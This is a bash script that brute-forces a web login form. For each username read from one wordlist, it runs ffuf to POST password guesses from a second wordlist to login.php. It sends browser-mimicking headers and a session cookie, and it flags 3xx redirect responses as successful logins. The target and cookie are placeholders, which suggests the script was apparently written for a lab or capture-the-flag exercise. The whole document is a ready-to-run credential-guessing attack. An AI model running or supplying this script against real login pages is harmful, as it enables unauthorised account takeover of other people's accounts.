#!/bin/bash

target=IP:PORT

trap 'echo -e "\n[!] Ctrl+C pressed. Exiting..."; exit 1' INT

echo "[*] Starting Enumeration"
echo "[*] Target: $target"
echo "-----------------------------------"

while read -r user; do
    [ -z "$user" ] && continue

    echo "[*] Testing: $user"

    ffuf -w "$2" -u "http://$target/login.php" \
         -X POST \
         -d "username=$user&password=FUZZ" \
         -H "Host: $target" \
         -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0" \
         -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
         -H "Accept-Language: en-US,en;q=0.9" \
         -H "Accept-Encoding: gzip, deflate, br" \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -H "Origin: http://$target" \
         -H "Connection: keep-alive" \
         -H "Referer: http://$target/login.php" \
         -H "Cookie: PHPSESSID=COOKIE" \
         -H "Upgrade-Insecure-Requests: 1" \
         -H "Priority: u=0, i" \
         -mc 300-400 \
         -sf \
         -timeout 60

    echo "Done Testing $user"
    echo "----------------------------------"

done < "$1"

echo "[*] Script completed normally"
